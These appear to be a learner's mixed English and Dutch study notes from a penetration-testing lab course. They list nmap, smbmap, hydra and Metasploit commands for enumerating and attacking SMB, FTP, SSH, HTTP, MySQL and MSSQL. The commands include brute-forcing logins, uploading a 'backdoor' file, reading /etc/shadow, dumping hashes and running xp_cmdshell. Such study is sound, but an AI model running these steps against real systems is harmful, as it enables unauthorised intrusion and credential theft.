

##### Servers & services 

**Server**:  it services something to a user, provides some sort of functionality that can be utilized by other devices. 
- We pull resources from servers (e.g. email/files). 
- Server can be running windows, linux, macOS. every computer can be a server 
- servers need to be accessed remotely 

**Services**: program on a computer that does a specific function) running on a server: 
- require a listening port on the server and accepting connections remotely. 
- open the barrier and allow access to program remotely 
- problem: misconfigure or bugs that can give remote access to whole system 


*Examples of services that you would see on a server* 

#### SMB (445)
- Windows file share implementation 
- CIFS (generic version) works the same as SMB 
- NetBIOS sets up session for smb 
  
SMB recon: 
-  Run an nmap scan for open ports: `nmap -T4 ip/cidr --open `
   Nmap ‘`--open`’ option would show only exposed ports of the live hosts
- Run scan for service enumeration on our OS: `nmap ip -sV -O` `nmap {target ip} -sV -sC`  
- `net use` in powershell for smb ![[Pasted image 20230509105010.png]]

SMB Discover and Mount: 
mount the SMB share of the target machine using the Windows File Explorer as well as using the command prompt

##### SMB: Nmap scripts

- nmap has an scripting engine (see documentation of nmap): `--script {scriptname}`

1. ping target ip to check connection  
2.  run an nmap scan:  `nmap {target ip}`
3. check if it has smb (port 445 is open)
4. run an nmap scan just on the smb port 445 where we look at the smb protocol: `*nmap -p445 --script smb-protocols {target ip}*`
5. run an nmap scan just on smb port 445 where we check the security mode:` *nmap -p445 --script smb-security-mode {target ip}*`
6. run an nmap scan where we enumerate a session: `*nmap -p445 --script smb-enum-sessions {target ip}*`
7. run the following nmap: `*nmap -p445 --script smb-enum-sessions --script-args* *smbusername={adminstrator}, smbpassword={smbserver_771} {target ip}*`
	 - `script-args`: geeft argumenten door aan het smb-enum-sessions script, die specifiek zijn voor dat script. 
	   
8. run the following nmap command to enumerate the shares: `*nmap -p445 --script smb-enum-shares {target ip}* `
	- gebruikt om de gedeelde bronnen te identificeren die beschikbaar zijn op een bepaalde host die SMB gebruikt op poort 445. SMB is een protocol dat wordt gebruikt voor het delen van bestanden en printers tussen computers op een netwerk.![[Pasted image 20230510145104.png]]
	- `ipc$ `is usefull because it is a ***null session*** (anonymous session) where you can get in as a **guest** account but also utilize this session: Het kan worden gebruikt door geautoriseerde gebruikers om verbinding te maken met het bestandssysteem en printers van de computer via het netwerk, zonder dat ze een geldige inlognaam of wachtwoord nodig hebben. 
	  
9. Now run a command where we enumerate the shares after authenticating: `*nmap -p445  --script smb-enum-shares --script-args smbusername=administrator, smbpaswordsmbserver_771 {target ip}*`
   
10. now enumerate the users to find out which users exist: `*nmap -p445 --script smb-enum-users --script-args smbusername=administrator smbpasword=smbserver_771 {target ip}*`  
     (bult in accounts for guests en password does not expire = misconfiguration). De gastaccount,. biedt beperkte toegang tot bepaalde bronnen, zoals bestanden en printers, en heeft geen wachtwoord nodig om toegang te krijgen
     
 11. run a command to look at server statistic: `*nmap -p445 --script smb-server-stats --script-arg smbusersname=administrator, smbpassword=smbserver_771 {target ip}*
     `
 13. run command to check what domains exist: `*nmap -p445 -script smb-enum-domains -s-cript-args smbusername=administrator, smbpassword=smbserver_771 {target ip}`*
     
 14. run command to check groups: `nmap -p445 --script smb-enum-groups --script-arg smbusername=adminsitrator, smbpassword=smbserver_771 {ip}* `
     
 15. run command to check what services are running: 
     ``nmap -p445 --script smb-enum-services   --script-arg smbusername=adminsitrator, smbpassword=smbserver_771 {ip}``

 16. run command to see what shares exist but also enumerate those shares: `*nmap -p445 --script smb-enum-shares,smb-ls      --script-arg smbusername=adminsitrator, smbpassword=smbserver_771 {ip}*  ` 
	 - `smb-enum-shares`: This script will enumerate all the SMB shares on the target system.
	-  `smb-ls`: This script will run the `ls` command on each share. Note that the `smb-ls` script requires authentication credentials for the target system. You can provide the credentials using the `smbusername` and `smbpassword` script arguments. For example:

##### SMBMap 

1. ping 
2.  `nmap {target ip}`
3. `nmap -p445 --script smb-protocols {targetip}`  this will tell us the procols and dialects. When we spot dialect SMBv1 which is dangerous we will use smbmap
4. `smbmap -u guest -p "" -d . -H {target ip} `
	- -   `-u guest`: gebruikt de gebruikersnaam "guest" om verbinding te maken met de host.
	-   `-p ""`: stelt het wachtwoord in op een lege string, wat betekent dat er geen wachtwoord wordt gebruikt om verbinding te maken met de host.
	-   `-d .`: stelt de domeinnaam in op "." (de huidige domeinnaam).
	-   `-H {target ip}`: specificeert het IP-adres van de doel-SMB-host waarmee verbinding moet worden gemaakt.

5.  `smbmap -H {taget ip} -u administrator -p smbserver_771 -x 'ipconfig'`
6. `*smbmap -H {taget ip} -u administrator -p 'smbserver_771' -L *`
7. if there is a `C$` : `smbmap -H {taget ip} -u Administrator -p 'smbserver_771' -r 'C$'`
	  
8. Lets try the following: 
	1. create a file `touch backdoor `
	2.  `smbmap -H {taget ip} -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'C$\backdoor' `
	3. `*smbmap -H {taget ip} -u Administrator -p 'smbserver_771' -r 'C$'*`
		 - If sucessfull then that means that you can upload a file. 
	4. download a file: `*smbmap -H {taget ip} -u Administrator -p 'smbserver_771' --download 'C$\{filename.extention}'* `
	5.  `cat filename`

   
####  SMB: Samba 1 

-  `nmap`  
-  udp scan with `--top-port 25 --open` 
-  service enumeration on open udp ports 
- `nmap {target ip} -p 445 --script smb-os-discovery `

	*msfconsole*
		- `use auxiliary/scanner/smb/smb_version `
	
- `nmblookup -A {target IP} `
   `nmblookup`- wordt gebruikt om NetBIOS-naamservers te bevragen om informatie te verkrijgen over NetBIOS-namen en hun bijbehorende IP-adressen. Door de optie `-A` te gebruiken,  voert het commando een omgekeerde zoekopdracht uit om de NetBIOS-naam op te halen die is gekoppeld aan dat IP-adres.  

We see <20> that means we can try to connect to this for this we use: smbclient. 

- `smbclient -h ` 
- `smbclient -L {targetip} -N  `
	-   `-N`: Deze optie schakelt de authenticatie uit

 *IPC$* with a *null* session: A null session refers to an unauthenticated connection or session established between a client and a server without providing any credentials

- `rcpclient -h `
- `rpcclient -U "" -N {target ip}`
	- `rpcclient`: Dit is de opdracht om een RPC-clientprogramma te starten
	-   `-U ""`: Deze optie geeft aan dat je een lege gebruikersnaam ("") gebruikt om verbinding te maken. Hiermee wordt een null session geïnitieerd, wat betekent dat er geen expliciete gebruikersnaam wordt verstrekt voor authenticatie.
	-   `-N`: Deze optie schakelt de authenticatie uit, waardoor er geen wachtwoord nodig is om verbinding te maken met de RPC-service.


Stappenplan: 

-    `nmap {targetip}`
-    `nmap -sV {targetip}`
-   `nmap -sU --top-ports 25 --open targetip``
-   `nmap -sU -sV --top-ports 25 --open targetip``
-   `nmap -p 445 --script smb-os-discovery targetip``
exploit in msfconsole 
-   `nmblookup -A targetip} .
-    `smbclient -L {targetip} -N` 
-    `rpcclient -U "" -N targetip' 


#####  SMB: Samba 2

- `nmap`
-  `rpcclient -U "" -N {Target ip}`
- `enum4linux -o {target ip}`
-  ` smbclient -L {target IP} `
-  `nmap {target} -p 445 --script smb-protocols``
- `msfconsole` -->  `use auxiliary/scanner/smb/smb2 
-  `nmap {ip} -p 445 --script smb-enum-users `
-  `enum4linux -U {target} `  
-  `rpcclient -U "" -N {Target ip} `
	- `enumdomusers` 
	 - `lookupnames amin `


#### SMB 3 

-  `nmap {target ip} -p 445 --script smb-enum-shares `
-  `use auxiliary/scanner/smb/smb_enumshares `
-  `enum4linux -S {ip} `
- `smbclient -L {target} -N`   (-N = nullsession)
- `enum4linux -G {target} `
- `rpcclient -U "" -N {target}`
	- `enumdomgroups`
-  `smbclient //target/Public -N `


#### SMB Dictonary Attack 
- wordlist = list of passwords e.g. rocky 
- Enumerate smb share: 
	- msfconsole 
	- use auxiliary/scanner/smb/smb_login 
	
- `gzip -d /usr/share/wordlists/rockyou.txt.gz `
		
- `*hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz  {target} smb*`
- `*smbmap -H {target} -u admin -p password1* `
- ` ***smbclient -L {target} -U jane  (password is 123abc)***`
-  `smbclient //target/jane -U jane `
- `smbclient //target/admin -U admin `
![[Pasted image 20230516103627.png]]
- ` exit smb > ls > use tar -xf flag.tar.gz `
- enumerate pipes: 
	- `msfconsole `
	- `use auxiliary/scanner/smb/pipe_auditor `
	
- `**enum4linux -r -u "admin" -p "password1" {target}** `
	

stappenplan 

1.  Enumerate SMB shares:
    -    `msfconsole`
		 `use auxiliary/scanner/smb/smb_login``
	    Set the password file with: `set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt`
    -   Set the SMB username with: `set smbuser {jane}`
    -   Run: `options` to confirm the settings
2.  Decompress the wordlist:
    -   Run: `gzip -d /usr/share/wordlists/rockyou.txt.gz`
3.  Perform a password attack using Hydra:
    -   Run: `hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} smb`
4.  Check if any shares are browsable:
    -   Run: `smbclient -L {target} -U jane -p 123abc`
5.  Explore the 'jane' share:
    -   Run: `smbclient //target/jane -U jane`
    -   Run: `ls` to list the files in the share
6.  Explore the 'admin' share:
    -   Run: `smbclient //target/admin -U admin`
    -   After authenticating, the prompt will change to `smb: \>`
    -   Run: `ls` to list the files in the share
7.  Extract a compressed file:
    -   Get the desired file using `smbclient`
    -   Exit the `smbclient` prompt
    -   Run: `ls` to verify the file is present
    -   Run: `tar -xf flag.tar.gz` to extract the compressed archive
8.  Enumerate named pipes:
    -   Open a terminal and run: `msfconsole`
    -   Inside the Metasploit console, run: `use auxiliary/scanner/smb/pipe_auditor`
    -   Set the SMB username with: `set smbuser admin`
    -   Set the SMB password with: `set smbpass password1`
    -   Set the target host with: `set rhost {target}`
    -   Run: `options` to view and verify the options
    -   Finally, run the module with: `run`
9.  Get a list of SIDs:
    -   Run: `enum4linux -r -u "admin" -p "password1" {target}`


---- 

####  FTP 
  
-  `nmap {target} -p 21 -sV -0`
- `hydra -L /usr/share/metasploit-framework/data/wordlist/common_users.txt -P /usr.share.metasploit-framework/data/wordlist/unix_passwords.txt {target ip} {service}` 
- `ftp {ip}`  (use credentials from the results from the hydra scan)
- `get` 
- `echo "sysadmin" > users `
- `cat users` 
  
ftp te bruteforce strategy: 
- `nmap ip --script ftp-brute --script-args usersb=/root/users -p 21`
	- -   `--script ftp-brute`: This option specifies that the FTP-brute script should be executed. The FTP-brute script is used to perform brute-force attacks against FTP services.
	-   `--script-args usersb=/root/users`: This option specifies the location of the username wordlist file to be used during the brute-force attack. In this case, the file is located at `/root/users`. Modify the path to the actual location of your username wordlist file.
	-   `-p 21`: This option specifies that only port 21 (FTP) should be scanned. The `-p` option followed by the port number restricts the scan to that specific port. In this case, port 21 is being scanned.



#### FTP Anonymous login 

- check open ports with `nmap` 
- `nmap ip  -p 21 --script ftp-anon `
	- `--script ftp-anon`: This option instructs Nmap to execute the "ftp-anon" script. The "ftp-anon" script is used to check if anonymous (unauthenticated) FTP access is allowed on the target system. 
	- If anonymous login is possible then login with username: anonymous and no password 


### SSH

- Secure shell -> communicate with remote machine over protected channel 
- Stappenplan: 

1. `Nmap` 
2.  `nmap ip -sV -O `
3. `ssh root@ip` and try to login with maybe `abc123 `
4. if permission denied try using netcat: `nc ip port  `(nc ip 22 ) this will give you the banner which is usefull for enumeration 
5. run: `nmap ip -p 22 --script ssh2-enum-algos `
	 - The script is designed to enumerate and display the supported encryption algorithms, key exchange algorithms, and message authentication codes (MACs) supported by the SSH server running on the target host. It helps in identifying the security configuration of the SSH service.
	 - By running this command, you can gather information about the SSH encryption algorithms supported by the target host. This can be useful for assessing the security posture of SSH services and ensuring that strong encryption algorithms are being used.
	
6. `nmap ip -p 22 --script ssh-hostkey --script-args ssh_hostkey=full`
	- `--script ssh-hostkey`: This option tells Nmap to use the `ssh-hostkey` script as part of the scan. The `ssh-hostkey` script is a built-in script in Nmap that retrieves and displays the SSH host key information for the target host.
	- It specifies the `full` option, which indicates that detailed information about the SSH host key should be retrieved.
7. check if there are any weak paswords for ssh: ` nmap ip -p 22 --script ssh-auth-methods --script-args="ssh.user=student"` 
	- -   `--script ssh-auth-methods`: Dit geeft aan dat de Nmap-scripts met betrekking tot SSH-authenticatiemethoden moeten worden uitgevoerd. Deze scripts zullen proberen de ondersteunde authenticatiemethoden te identificeren die beschikbaar zijn op de SSH-server.
	-   `--script-args="ssh.user=student"`: Dit is een scriptargument dat wordt doorgegeven aan de Nmap-scripts. In dit geval wordt de argumentwaarde "student" gebruikt om aan te geven dat de scan moet worden uitgevoerd alsof de gebruiker "student" is. Dit kan nuttig zijn als de SSH-server verschillende authenticatiemethoden aanbiedt op basis van de gebruiker. met deze opdracht wordt een Nmap-scan uitgevoerd om de SSH-authenticatiemethoden te identificeren die beschikbaar zijn op het opgegeven doel-IP-adres, waarbij de scan wordt uitgevoerd alsof de gebruiker "student" is.
	- if the result is none than is dangerous 
8. check if there are any weak paswords for ssh for admin: ` nmap ip -p 22 --script ssh-auth-methods --script-args="ssh.user=admin" `

`
`nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat ``/home/student/FLAG, ssh-run.username=student,ssh-run.password=" ip 
-  `--script=ssh-run`: This option specifies that the "ssh-run" script should be executed as part of the Nmap scan. The "ssh-run" script is a pre-defined script in Nmap that allows running custom commands on an SSH server.
-   `--script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=student,ssh-run.password="`: This argument provides the arguments or parameters to the "ssh-run" script. It consists of three key-value pairs:
    -   `ssh-run.cmd=cat /home/student/FLAG`: This specifies the command to be executed on the SSH server. In this case, the command is `cat /home/student/FLAG`, which will read the contents of the "/home/student/FLAG" file on the remote SSH server.
    -   `ssh-run.username=student`: This sets the SSH username to "student". It specifies the username that will be used to authenticate with the SSH server during the scan.
    -   `ssh-run.password="`: This leaves the SSH password field empty. It means that no password is provided for authentication, and the script will attempt to connect to the SSH server using other authentication methods like public keys or other configured methods.


###  SSH Dictonary attack 


- `nmap ip -sV -p 22 `
- `gzip -d /urs/share/wordlist/rockyou.txt.gz  ` 
-  ` hydra -l student -P /usr/share/wordlist/rockyou.txt ip ssh `
- `ssh student@ip` 
- lets check for admin: 
	- `echo "adminsitrator" > user`
		- e`cho "adminsitrator" > user`: This command creates a file named "user" and writes the string "administrator"  into it. This file will be used as a user database for the SSH brute force attack.
	- `**nmap ip -p 22 --script ssh-brute --script-args userdb=/root/user** `
		- -   `--script ssh-brute`: It instructs Nmap to use the "ssh-brute" script, which is designed to perform a brute force attack against SSH servers.
		-   `--script-args userdb=/root/user`: This option provides the script argument "userdb" with the value "/root/user". It tells the "ssh-brute" script to use the specified file ("/root/user") as the user database for the brute force attack. The file should contain a list of usernames or user passwords that will be used during the attack.
- lets try the root password: 
	- `msfconsole` 
	- `use auxiliary/scanner/ssh/ssh_login` 


---


### HTTP 
 
- `nmap -sV -O `
	- when port 80 is open we check in our webbrowser is we can connect to the website 
- `whatweb targetip `
	- By executing "whatweb targetip," you are instructing the tool to scan the specified IP address and provide information about the technologies, frameworks, content management systems (CMS), server software, and other relevant details associated with the target web server 
- `http target ip `
- `dirb http://ip `
	- dirb will look for directories - first it will ook at toplevel directories then it will  go to subfolders 
- `browsh --startup-url http:// `
  ![[Pasted image 20230606133353.png]]
  this will try to render the website if you do not have a browser 


**Default.aspx is de default pagina als je de website bezoekt voor websites gebouwdt met microsoft aspx** 

### HTTP ISS Nmap script 

- `nmap 
-  check services but also what directories there are: 
  `nmap ip -sV -p 80 --script http-enum `
- `nmap ip -sV -p 80 --script http-headers` 
- `nmap ip -sV -p 80 --script http-methods --script=args http-methods.url-path=/webdav/`
- `nmap ip -sV -p 80 --script http-webdav-scan --script=args http-methods.url-path=/webdav/`


### HTTP Apache 

- run basic scan, service scan on specific port (80) 
- `nmap ip -p 80 -sV -script banner `
	- banner: is information that is shared with you computer, the first time it connects remotely to another machine 
 - mfsconsole (metasploit framework)
	 - use auxiliary/scanner/http/http_version 
	- use auxiliary/scanner/http/brute_dirs 
- `- dirb http://ip /usr/share/metasploit-framework/data/wordlists/directory.txt` (zelfde als brute_dirs scanner in metasploit)
- other commands you can run: 
	- `curl ip `
	- `wget "http://ip/index"` will retrieve webfiles 
	- `browsh --startup-url ip` (will render the website)s
	- `lynx http://ip `
- `robot.txt: `
	- msfconsole 
		- use  auxiliary/scanner/http/robots_txt 

robot.txt -> dit is een pagina die aangeeft welke bestanden mogen gelezen worden door search engines - het kan je vertellen welke subdirectories er zijn 


## SLQ 


#### MySQL

Runs on linux or Unix and allows users to store info in database, can be pulled and used in many operations. It is often misconfigured and vulnerable 

**!!!!!!!! Let op by commands in mysql vergeet niet de ; aan het einde van de command** 

how do we enumerate? 
- `service scan`
- service scan on port with mysql 
- `mysql -h ip -u root   `                                      
     (-h = host -u = username, we are running out because root is often default admin we will try to login in sql)
	- if you can login run: `show databases` (to look at the data)
	- `use {database};` (we are looking into the database "books") or run: select count(\*) from authors; 
	- run help to see commands in sql 
	  
msfconsole
- `use auxiliary/scanner/mysql/mysql_writeable_dirs  `
- `set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt `
- `setg rhost 192.125.250.3`                               
- `set verbose false`    
- `set password "" `
- `options`  (check if you have al required items then run)

- `use auxiliary/scanner/mysql/mysql_hashdump`  
  (you will get hashes of users)
- `set username root    set password "" run `

`loginto mysql (mysql -h ip -u root)`
- `select load_file("/etc/shadow")`   (test if you have access to files on sql system) 

nmap: 
- `nmap ip -sV -p port --script=mysql-empty-password`   (see what account you can get into with null session (empty password))
-  `nmap ip -sV -p port --script=mysql-info `
  
- `nmap ip -sV -p port --script=mysql-users --script args="mysqlusers='root',mysqlpass=' ' " `
  
- if you cant log into sql you can try this: `nmap ip -sV -p port --``script=mysql-databases --script args="mysqlusers='root',mysqlpass=' ' " `
- `- nmap ip -sV -p port --script=mysql-audit --script args="mysql-audit.username='root',mysql-audit.password=' ',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit' "`
  
- Get all the hashes: `nmap ip -sV -p port --script=mysql-dump-hashes --script args="username='root',password=' ' " `
  
- use nmap to run a query: `nmap ip -sV -p port --script=mysql-query --script args=" query='select count(\*) from books.authors;', username='root',password=' ' " `


-> if you want to get hashes of users - loginto mysql remotly and try to access the /etc/shadow file by running the following command: select load_file("/etc/shadow")
 

### MySQL Dictionary Attack 

Een MySQL dictionary-aanval is een aanvalsvector waarbij een aanvaller probeert toegang te krijgen tot een MySQL-database door systematisch verschillende gebruikersnamen en wachtwoorden uit een vooraf samengestelde lijst, ook wel een woordenboek genoemd, te proberen. 

- run a service scan 
- utalize msfconsole and an auxiliary scanner to brute force the login 
	- use auxiliary.scanner/mysql/mysql_login
	- set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
	- set verbose  false 
	- set stop_on_success true (we only need one password for username )
	- set username root 
- Another way to bruteforce login: 
	- `hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ip mysql `
	


### MSSQL Nmap scripts 

- run nmap scan and service scan on port sql 
- run script for ms-sql-info: `nmap ip -p port --script ms-sql-info `
- run script for ms-sql-ntlm-info: `nmap ip -p port --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 `
		This script is designed to gather information related to Microsoft SQL Server using the NTLM authentication method.
- run MSSQL brute force: `nmap ip -p port --script ms-sql-brute --script-args ``userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt  `
- Check if there are any empty passwords: `nmap ip -p port --script ms-sql-empty-password  `
- How to take advantange of results from bruteforce: 
	- run query: `nmap ip -p port --script ms-sql-query --script-args mmsql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT \* FROM master..syslogins"  -oN output.txt `
	- `--script ms-sql-query`: Hiermee geef je aan dat je de Nmap-script "ms-sql-query" wilt uitvoeren. Deze script maakt het mogelijk om aangepaste SQL-query's uit te voeren op de SQL Server-database.
	- `--script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins"`: Dit geeft de argumenten door aan het script. Het stelt de gebruikersnaam (`mssql.username`) in op "admin" en het wachtwoord (`mssql.password`) op "anamaria". Het argument `ms-sql-query.query` bevat de specifieke SQL-query die je wilt uitvoeren op de database, in dit geval "SELECT * FROM master..syslogins".  De `syslogins`-tabel is specifiek voor Microsoft SQL Server-databases. Het is een systeemtabel die gebruikersaccounts en inloggegevens van de database bevat. Elke rij in deze tabel vertegenwoordigt een gebruikersaccount met bijbehorende informatie, zoals gebruikersnaam, wachtwoord en privileges.
	- `-oN output.txt`: Dit zorgt ervoor dat de resultaten van de scan worden opgeslagen in het bestand "output.txt". Het rapport van de scan wordt opgeslagen in een normaal tekstbestand.

- dump hashes: `nmap ip -p port --script ms-sql-dump-hashes   --script-args mmsql.username=admin,mssql.password=anamaria`
- try to run code: ` nmap ip -p port --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cdm="ipconfiig"`
(if successfull you are able to run commands in a shell remotely)

- `map ip -p port --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cdm="type C:\\flag.txt"   `
	(flag is windows version of cat (read a file))



### MSSQL Metasploit 

- run service scan on `sql ports `
- run script for `ms-sql-info (--script ms-sql-info)`
- use metasploit to bruteforce logon info 
	- use aux scanner for ms-sql : mssql_login 
	- set  user_file /root/Desktop/wordlist/common_users.txt 
	- set set pass_file /root/desktop.wordlist/100-common-passwords.txt  
- auxiliary/admin/mssql/mssql_enum 
- auxiliary/admin/mssql/mssql_sql_logins 
- auxiliary/admin/mssql/mssql_exec 
	- set cmd whoami 
- use auxiliary/admin/mssql/mssql_enum_domain_accounts


Domain accounts, in the context of Microsoft SQL Server, refer to user accounts that are managed and authenticated by a Windows Active Directory domain. These accounts are used to provide access to various resources within a domain, including SQL Server databases. 

